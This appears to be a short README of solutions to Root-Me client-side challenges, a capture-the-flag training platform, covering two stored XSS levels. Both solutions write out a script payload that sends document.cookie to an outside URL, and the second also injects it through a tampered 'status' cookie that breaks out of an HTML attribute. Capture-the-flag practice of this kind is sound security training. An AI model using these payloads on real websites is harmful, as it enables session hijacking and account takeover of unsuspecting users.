# Rootme-App-Client
App Client Challenges Summary

### XSS- Stored 1
Post a message with content is the following:
`<script>fetch("URL?c="+document.cookie)</script>
`
### XSS - Stored 2
Post a random message, then Ctrl + U to view source code. 

There are 2 style definitions : `invite` & `admin`.

Besides, when open cookies manage, we see a value of `status` is `invite`. 

Change this value into `admin` and try posting a message, this change will affect to tag `i` after message title.

So we're going to exploit this.

Change `status` cookie into `"><script>fetch("URL?c="+document.cookie)</script>` and post a message
